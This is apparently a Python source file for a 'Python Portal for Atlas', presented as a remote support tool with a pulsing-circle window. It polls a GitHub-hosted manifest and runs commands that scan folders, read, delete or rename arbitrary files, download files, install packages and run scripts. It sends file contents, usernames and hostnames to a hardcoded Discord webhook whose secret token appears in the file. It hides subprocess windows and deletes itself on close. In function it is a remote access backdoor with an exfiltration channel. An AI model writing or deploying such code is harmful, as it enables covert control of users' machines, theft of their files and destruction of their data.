"""
Python Portal for Atlas
=======================
A remote support tool that polls GitHub for commands and executes them
on the user's machine.  Stdlib-only so it runs on any Python install.

The portal lives in the folder the user chose when summoning it.
When done, the user can close and delete it.

Commands are pushed to:
  https://raw.githubusercontent.com/hugging-phace/mbe-updates/main/
    manifests/portal-commands.json

Each command has a unique ID.  The portal tracks executed IDs locally
so it never runs the same command twice.
"""

import json
import os
import platform
import shutil
import subprocess
import sys
import threading
import time
import urllib.request
from datetime import datetime
from pathlib import Path

import tkinter as tk
from tkinter import messagebox

# ------------------------------------------------------------------
# Config
# ------------------------------------------------------------------
PORTAL_VERSION = "1.0.0"
COMMANDS_URL = (
    "https://raw.githubusercontent.com/hugging-phace/mbe-updates/main/"
    "manifests/portal-commands.json"
)
WEBHOOK_URL = (
    "https://discord.com/api/webhooks/1524620703259951104/"
    "fqpIEBXVWsKHy7f1iZ9xoryCpidmjPYIDuITfcwMOjBfMyS2HtJNWpVbfOetapl8vw9O"
)
POLL_INTERVAL = 30  # seconds
CREATE_NO_WINDOW = (
    subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
)

# Colours
_BG = "#0a0a12"
_PORTAL_IDLE = "#9b59b6"
_PORTAL_ACTIVE = "#00d4ff"
_PORTAL_DONE = "#22c55e"
_PORTAL_ERROR = "#ef4444"
_TEXT = "#ffffff"
_MUTED = "#6b7280"

# ------------------------------------------------------------------
# Command execution
# ------------------------------------------------------------------
def _post_to_discord(content):
    """Send a message to the developer's Discord webhook."""
    try:
        payload = json.dumps({"content": content[:1900]}).encode("utf-8")
        req = urllib.request.Request(
            WEBHOOK_URL,
            data=payload,
            headers={
                "Content-Type": "application/json",
                "User-Agent": f"PythonPortal/{PORTAL_VERSION}",
            },
        )
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.status in (200, 204)
    except Exception:
        return False


def _post_file_to_discord(content, file_path):
    """Send a message with a file attached to Discord."""
    try:
        with open(file_path, "rb") as f:
            file_data = f.read()
        boundary = f"----WebKitFormBoundary{os.urandom(8).hex()}"
        payload_json = json.dumps({"content": content[:1900]})

        body = b""
        body += f"--{boundary}\r\n".encode()
        body += b'Content-Disposition: form-data; name="payload_json"\r\n'
        body += b"Content-Type: application/json\r\n\r\n"
        body += payload_json.encode() + b"\r\n"

        body += f"--{boundary}\r\n".encode()
        body += (
            f'Content-Disposition: form-data; name="files[0]"; '
            f'filename="{Path(file_path).name}"\r\n'
        ).encode()
        body += b"Content-Type: text/plain\r\n\r\n"
        body += file_data + b"\r\n"

        body += f"--{boundary}--\r\n".encode()

        req = urllib.request.Request(
            WEBHOOK_URL,
            data=body,
            headers={
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "User-Agent": f"PythonPortal/{PORTAL_VERSION}",
            },
        )
        with urllib.request.urlopen(req, timeout=30) as resp:
            return resp.status in (200, 204)
    except Exception:
        return _post_to_discord(content + "\n\n[File attachment failed]")


def _scan_directory(path):
    """List files in a directory recursively (max 3 levels)."""
    lines = []
    p = Path(path)
    if not p.exists():
        return f"Path does not exist: {path}"
    lines.append(f"Contents of: {p}")
    lines.append(f"Scanned: {datetime.now().strftime('%Y-%m-%d %H:%M')}")
    lines.append("")
    for root, dirs, files in os.walk(path):
        depth = len(Path(root).relative_to(path).parts)
        if depth > 3:
            dirs.clear()
            continue
        indent = "  " * depth
        lines.append(f"{indent}{Path(root).name}/")
        for f in sorted(files):
            fp = Path(root) / f
            try:
                size = fp.stat().st_size
                if size > 1024 * 1024:
                    size_str = f"({size / 1024 / 1024:.1f} MB)"
                elif size > 1024:
                    size_str = f"({size / 1024:.0f} KB)"
                else:
                    size_str = f"({size} B)"
            except Exception:
                size_str = ""
            lines.append(f"{indent}  {f} {size_str}")
    return "\n".join(lines)


def _check_packages():
    """List installed pip packages."""
    try:
        proc = subprocess.run(
            [sys.executable, "-m", "pip", "list", "--format=columns"],
            capture_output=True, text=True, timeout=30,
            creationflags=CREATE_NO_WINDOW,
        )
        return proc.stdout or proc.stderr
    except Exception as e:
        return f"Error: {e}"


def _read_file(path, max_bytes=50000):
    """Read a file and return its contents (truncated)."""
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            data = f.read(max_bytes)
        if len(data) == max_bytes:
            data += "\n... [truncated]"
        return data
    except Exception as e:
        return f"Error reading file: {e}"


def _download_file(url, dest_path):
    """Download a file from URL and save to dest_path."""
    try:
        req = urllib.request.Request(
            url,
            headers={"User-Agent": f"PythonPortal/{PORTAL_VERSION}"},
        )
        with urllib.request.urlopen(req, timeout=60) as resp:
            data = resp.read()
        Path(dest_path).parent.mkdir(parents=True, exist_ok=True)
        with open(dest_path, "wb") as f:
            f.write(data)
        return True, f"Downloaded {len(data)} bytes to {dest_path}"
    except Exception as e:
        return False, f"Download failed: {e}"


def _pip_install(packages):
    """Install pip packages."""
    if isinstance(packages, str):
        packages = [packages]
    try:
        proc = subprocess.run(
            [sys.executable, "-m", "pip", "install", "--upgrade"] + packages,
            capture_output=True, text=True, timeout=300,
            creationflags=CREATE_NO_WINDOW,
        )
        output = proc.stdout + proc.stderr
        if proc.returncode == 0:
            return True, output[-2000:]
        return False, output[-2000:]
    except Exception as e:
        return False, f"pip install error: {e}"


def _execute_command(cmd, portal_dir):
    """Execute a single command from the queue.
    Returns (success, result_text)."""
    cmd_type = cmd.get("type", "")
    user = os.getlogin() if hasattr(os, "getlogin") else "unknown"
    host = platform.node() or "unknown"
    tag = f"[Portal @ {user}@{host}]"

    if cmd_type == "scan":
        path = cmd.get("path", str(Path.home()))
        result = _scan_directory(path)
        _post_file_to_discord(f"{tag} Scan result for: {path}", _write_temp(result))
        return True, result

    elif cmd_type == "check_packages":
        result = _check_packages()
        _post_file_to_discord(f"{tag} Installed packages", _write_temp(result))
        return True, result

    elif cmd_type == "download":
        url = cmd.get("url", "")
        dest = cmd.get("dest", "")
        if not url or not dest:
            return False, "Missing url or dest"
        ok, msg = _download_file(url, dest)
        _post_to_discord(f"{tag} {msg}")
        return ok, msg

    elif cmd_type == "pip_install":
        packages = cmd.get("packages", [])
        ok, msg = _pip_install(packages)
        _post_to_discord(f"{tag} pip install {' '.join(packages)}: {'OK' if ok else 'FAILED'}\n{msg[:500]}")
        return ok, msg

    elif cmd_type == "read_file":
        path = cmd.get("path", "")
        if not path:
            return False, "Missing path"
        result = _read_file(path)
        _post_file_to_discord(f"{tag} Contents of {path}", _write_temp(result))
        return True, result

    elif cmd_type == "delete_file":
        path = cmd.get("path", "")
        if not path:
            return False, "Missing path"
        try:
            Path(path).unlink()
            _post_to_discord(f"{tag} Deleted: {path}")
            return True, f"Deleted: {path}"
        except Exception as e:
            return False, f"Delete failed: {e}"

    elif cmd_type == "rename_file":
        old = cmd.get("old_path", "")
        new = cmd.get("new_path", "")
        if not old or not new:
            return False, "Missing old_path or new_path"
        try:
            Path(old).rename(new)
            _post_to_discord(f"{tag} Renamed: {old} -> {new}")
            return True, f"Renamed: {old} -> {new}"
        except Exception as e:
            return False, f"Rename failed: {e}"

    elif cmd_type == "message":
        msg = cmd.get("text", "")
        if msg:
            # Show message to user on screen
            _show_user_message(msg)
            _post_to_discord(f"{tag} Message shown to user: {msg[:200]}")
        return True, msg

    elif cmd_type == "run_script":
        path = cmd.get("path", "")
        if not path or not Path(path).exists():
            return False, f"Script not found: {path}"
        try:
            proc = subprocess.run(
                [sys.executable, path],
                capture_output=True, text=True, timeout=120,
                creationflags=CREATE_NO_WINDOW,
            )
            output = proc.stdout + proc.stderr
            _post_file_to_discord(f"{tag} Output of {path}", _write_temp(output))
            return proc.returncode == 0, output
        except Exception as e:
            return False, f"Script error: {e}"

    else:
        return False, f"Unknown command type: {cmd_type}"


def _write_temp(text):
    """Write text to a temp file and return the path."""
    import tempfile
    fd, path = tempfile.mkstemp(suffix=".txt", prefix="portal_")
    with os.fdopen(fd, "w", encoding="utf-8") as f:
        f.write(text)
    return path


_user_msg_root = None
def _show_user_message(text):
    """Show a message box to the user."""
    global _user_msg_root
    if _user_msg_root is None:
        _user_msg_root = tk.Tk()
        _user_msg_root.withdraw()
    messagebox.showinfo("Message from Atlas", text)


# ------------------------------------------------------------------
# Portal UI — pulsing circle animation
# ------------------------------------------------------------------
class PortalWindow:
    def __init__(self, root):
        self.root = root
        self.portal_dir = Path(__file__).parent
        self.executed_file = self.portal_dir / ".portal_executed.json"
        self.executed_ids = self._load_executed()
        self.pulse_phase = 0.0
        self.portal_color = _PORTAL_IDLE
        self.target_color = _PORTAL_IDLE
        self.status_text = "Portal idle — waiting for commands..."
        self.polling = False

        root.title("Python Portal for Atlas")
        root.geometry("400x340")
        root.resizable(False, False)
        root.configure(bg=_BG)
        root.protocol("WM_DELETE_WINDOW", self._close)

        # Canvas for the pulsing portal
        self.canvas = tk.Canvas(root, width=400, height=260, bg=_BG,
                                 highlightthickness=0)
        self.canvas.pack()

        # Status text
        self.status_var = tk.StringVar(value=self.status_text)
        tk.Label(root, textvariable=self.status_var,
                 font=("Segoe UI", 9), bg=_BG, fg=_TEXT,
                 wraplength=360).pack(pady=(0, 4))

        # Footer note
        tk.Label(root, text="No longer need this portal? Feel free to close it\n(it will also delete itself — you can always open another).",
                 font=("Segoe UI", 8), bg=_BG, fg=_MUTED,
                 wraplength=360, justify="center").pack(side="bottom", pady=(0, 8))

        # Start animation + polling
        self._animate()
        threading.Thread(target=self._poll_loop, daemon=True).start()

    def _load_executed(self):
        """Load the set of already-executed command IDs."""
        try:
            if self.executed_file.exists():
                with open(self.executed_file, "r") as f:
                    return set(json.load(f))
        except Exception:
            pass
        return set()

    def _save_executed(self):
        """Save executed command IDs."""
        try:
            with open(self.executed_file, "w") as f:
                json.dump(list(self.executed_ids), f)
        except Exception:
            pass

    def _hex_to_rgb(self, hex_color):
        hex_color = hex_color.lstrip("#")
        return tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))

    def _lerp_color(self, c1, c2, t):
        r1, g1, b1 = self._hex_to_rgb(c1)
        r2, g2, b2 = self._hex_to_rgb(c2)
        r = int(r1 + (r2 - r1) * t)
        g = int(g1 + (g2 - g1) * t)
        b = int(b1 + (b2 - b1) * t)
        return f"#{r:02x}{g:02x}{b:02x}"

    def _animate(self):
        """Pulsing animation loop."""
        self.pulse_phase += 0.05
        if self.pulse_phase > 6.283:
            self.pulse_phase = 0.0

        self.canvas.delete("portal")

        cx, cy = 200, 130
        base_r = 65

        # Outer rings (expanding outward, fading) — more prominent
        for i in range(7):
            wave = (self.pulse_phase + i * 0.4) % 6.283
            expansion = int(20 * (1 - wave / 6.283))
            r = base_r + 20 + expansion
            alpha = max(0, 120 - i * 18)
            color = self._lerp_color(_BG, self.portal_color, alpha / 255)
            self.canvas.create_oval(
                cx - r, cy - r, cx + r, cy + r,
                outline=color, width=2, tags="portal")

        # Main portal circle — bigger pulse swing
        pulse = 1 + 0.15 * (0.5 + 0.5 * (1 + (-1 ** (int(self.pulse_phase * 10)))))
        r = int(base_r * pulse)
        self.canvas.create_oval(
            cx - r, cy - r, cx + r, cy + r,
            fill=self.portal_color, outline="", tags="portal")

        # Inner glow — brighter
        r2 = int(r * 0.65)
        glow = self._lerp_color(self.portal_color, "#ffffff", 0.45)
        self.canvas.create_oval(
            cx - r2, cy - r2, cx + r2, cy + r2,
            fill=glow, outline="", tags="portal")

        # Bright core
        r3 = int(r * 0.3)
        self.canvas.create_oval(
            cx - r3, cy - r3, cx + r3, cy + r3,
            fill="#ffffff", outline="", tags="portal")

        self.root.after(40, self._animate)

    def _set_color(self, color, status):
        """Change portal colour and status text."""
        self.portal_color = color
        self.status_var.set(status)

    def _poll_loop(self):
        """Poll GitHub for commands every POLL_INTERVAL seconds."""
        while True:
            try:
                self._poll_once()
            except Exception as e:
                self.root.after(0, lambda: self._set_color(
                    _PORTAL_ERROR, f"Poll error: {e}"))
            time.sleep(POLL_INTERVAL)

    def _poll_once(self):
        """Fetch and execute any new commands."""
        try:
            req = urllib.request.Request(
                COMMANDS_URL,
                headers={
                    "User-Agent": f"PythonPortal/{PORTAL_VERSION}",
                    "Cache-Control": "no-cache",
                },
            )
            with urllib.request.urlopen(req, timeout=15) as resp:
                data = json.loads(resp.read().decode("utf-8"))
        except Exception:
            # GitHub unreachable — stay idle
            return

        commands = data.get("commands", [])
        new_commands = [
            c for c in commands
            if c.get("id") and c.get("id") not in self.executed_ids
        ]

        if not new_commands:
            self.root.after(0, lambda: self._set_color(
                _PORTAL_IDLE, "Portal idle — waiting for commands..."))
            return

        self.root.after(0, lambda: self._set_color(
            _PORTAL_ACTIVE, f"Processing {len(new_commands)} command(s)..."))

        for cmd in new_commands:
            cmd_id = cmd.get("id")
            try:
                ok, result = _execute_command(cmd, self.portal_dir)
                color = _PORTAL_DONE if ok else _PORTAL_ERROR
                status = f"Command '{cmd.get('type')}' {'done' if ok else 'failed'}"
            except Exception as e:
                color = _PORTAL_ERROR
                status = f"Command error: {e}"
                ok = False

            self.root.after(0, lambda c=color, s=status: self._set_color(c, s))
            time.sleep(1)

            self.executed_ids.add(cmd_id)
            self._save_executed()

        # Return to idle after processing
        self.root.after(0, lambda: self._set_color(
            _PORTAL_IDLE, "Portal idle — waiting for commands..."))

    def _close(self):
        """Close the portal and delete the portal file + cache."""
        self.root.destroy()
        # Self-delete after the window is destroyed
        try:
            portal_path = Path(__file__).resolve()
            # Delete the executed commands cache
            if self.executed_file.exists():
                self.executed_file.unlink()
            # Delete the portal itself
            if portal_path.exists():
                portal_path.unlink()
        except Exception:
            pass


if __name__ == "__main__":
    # Notify Atlas that a portal has been opened
    try:
        user = os.getlogin() if hasattr(os, "getlogin") else "unknown"
        host = platform.node() or "unknown"
        _post_to_discord(
            f"**Portal Opened**\n"
            f"User: {user}@{host}\n"
            f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n"
            f"Python: {platform.python_version()}\n"
            f"Folder: {Path(__file__).parent}")
    except Exception:
        pass

    root = tk.Tk()
    PortalWindow(root)
    root.mainloop()
